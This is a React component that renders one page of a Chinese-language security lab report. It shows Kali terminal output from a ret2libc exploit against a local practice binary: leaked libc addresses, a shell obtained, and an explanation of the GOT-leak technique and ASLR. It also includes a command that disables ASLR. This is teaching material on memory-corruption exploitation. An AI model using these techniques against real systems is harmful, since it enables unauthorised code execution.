import React from 'react';
import { A4Page } from '../shared';
import { KaliTerminal } from './Lab3Part1';

// 实验四 第十二部分 - ret2libc 类型3 运行结果
export const Lab4Part12: React.FC = () => (
    <A4Page id="lab4-part12">
        <p className="text-sm mb-2">步骤3：运行 exp 脚本</p>
        <KaliTerminal>
{`┌──(kali㉿kali)-[~/lab4]
└─$ python3 ret2libc2.py
[x] Starting local process './ret2libc2'
[+] Starting local process './ret2libc2': pid 274159
[*] '/home/kali/lab4/ret2libc2'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
[*] '/usr/lib32/libc.so.6'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[+] write address: 0xf7d1d3f0
[+] system address: 0xf7c53660
[+] /bin/sh address: 0xf7dc7dd2
[*] Switching to interactive mode
$ whoami
kali
$ id
uid=1000(kali) gid=1000(kali) groups=1000(kali)
$ exit
[*] Stopped process './ret2libc2' (pid 274159)`}
        </KaliTerminal>

        <p className="text-sm mb-3 text-justify leading-relaxed indent-8">
            ret2libc 类型3 攻击成功！通过 GOT 泄露技术，我们成功获取了 write 函数在 libc 中的
            真实地址 0xf7d1d3f0，然后计算出 system 函数地址 0xf7c53660 和 "/bin/sh" 字符串
            地址 0xf7dc7dd2，最终成功执行 system("/bin/sh") 获取了 shell。
        </p>

        <p className="text-sm mb-3 text-justify leading-relaxed indent-8">
            这种攻击方式是最通用的 ret2libc 技术，即使程序本身没有 system 函数和 "/bin/sh" 字符串，
            只要程序链接了 libc 库，我们就可以通过泄露任意一个 libc 函数的地址来计算出
            所需函数的地址。这也是为什么 ASLR 保护如此重要的原因——如果 ASLR 开启，
            每次程序运行时 libc 的加载地址都会随机化，攻击者就无法直接使用固定的地址。
        </p>

        <p className="text-sm mb-3 text-justify leading-relaxed indent-8">
            本实验中我们关闭了 ASLR（echo 0 &gt; /proc/sys/kernel/randomize_va_space），
            所以 libc 的加载地址是固定的。在实际攻击中，如果 ASLR 开启，
            攻击者需要通过信息泄露漏洞来获取 libc 的基址。
        </p>
    </A4Page>
);

export default Lab4Part12;
